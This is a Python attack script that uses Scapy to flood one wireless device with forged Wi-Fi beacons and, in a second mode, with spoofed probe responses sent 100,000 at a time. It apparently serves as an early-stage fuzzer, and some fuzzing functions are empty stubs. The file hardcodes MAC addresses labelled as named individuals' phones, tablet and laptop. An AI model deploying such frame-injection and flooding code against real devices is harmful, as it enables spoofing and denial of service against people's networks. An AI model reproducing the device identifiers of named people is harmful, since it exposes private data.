from datetime import datetime
from scapy.all import *
import random
import time
import sys

monitor = "wlan0"
injector = "wlan0"
#target = "6C:C7:EC:BA:E9:22" # Shaked's phone
#target = "8C:83:E1:F4:16:EC" # Shaked's tablet
#target = "DC:0C:5C:B0:D7:36" # Ella's phone
target = "44:85:00:1C:3A:0E" # Ella's laptop
source = "00:0c:29:52:66:4e"
	
def getEssid(pkt): 
	dot11elt = pkt.getlayer(Dot11Elt)
	while dot11elt:
		if(dot11elt.ID == 0):
			return dot11elt.info
		dot11elt = dot11elt.payload.getlayer(Dot11Elt)
	return ''

def setEssid(pkt, essid):
	dot11elt = pkt.getlayer(Dot11Elt)
	while dot11elt:
		if(dot11elt.ID == 0):
			dot11elt.info = essid
			dot11elt.len = len(dot11elt.info)
		dot11elt = dot11elt.payload.getlayer(Dot11Elt)

def fuzzProbeResponse(pkt):
	layer = pkt.getlayer(Dot11Elt)
	while layer:
			if(layer.ID == 0):
				layer.remove_payload() # TODO : maybe change to adding the ssid layer to the end instead of making it the end
				layer.info = 'TEST AP'  # length < 1495 : visible, length >= 1495 : not visible
				layer.len = len(layer.info) # limited up to 255 (maybe due to Scapy's rules)
			layer = layer.payload.getlayer(Dot11Elt)

def craftProbeResponse(pkt):
	afterRequestLayer = pkt.getlayer(Dot11ProbeReq).payload
	pkt.getlayer(Dot11ProbeReq).underlayer.remove_payload()
	pkt = pkt / Dot11ProbeResp(cap = 0x1100) / afterRequestLayer
	pkt.getlayer(Dot11).subtype = 5 # change subtype to 5 means the packet is of type probe response
	
	clientAddress = pkt.getlayer(Dot11).addr2
	apAddress = pkt.getlayer(Dot11).addr1
	pkt.getlayer(Dot11).addr1, pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11).addr3 = clientAddress, source, source
	return pkt

def fuzzBeacon(pkt):
	x = 0

def craftBeacon():
	name = 'TEST AP'
	pkt = RadioTap() / Dot11(type = 0, subtype = 8, addr1 = target, addr2 = source, addr3 = source) \
		/Dot11Beacon(cap = 0x1100) \
		/Dot11Elt(ID = 0, len = len(name), info = name)
	return pkt
	
def handleProbeResponse(pkt):
	if pkt.haslayer(Dot11ProbeReq) and pkt.haslayer(Dot11EltDSSSet) and pkt.haslayer(Dot11EltRates, 2):
		if(pkt.getlayer(Dot11).addr2.lower() != target.lower()):
			return
		print('got probe request from the target, crafting a probe response.')
		resp = craftProbeResponse(pkt) 
		for i in range(100000):
			fuzzProbeResponse(resp)
			sendp(resp, iface = injector, verbose = False)

def sendBeacon():
	beacon = craftBeacon() 
	fuzzBeacon(beacon)
	sendp(beacon, iface = injector, verbose = False)
				
def probeAttack():
	sniff(iface = monitor, prn = handleProbeResponse)
	while 1:
		time.sleep(1)

def beaconAttack():
	while 1:
		sendBeacon()
		
if __name__ == '__main__':
	print('\n' + 'Attacker Initialized')
	print('Attacking the target: ' + target + '\n')
	beaconAttack()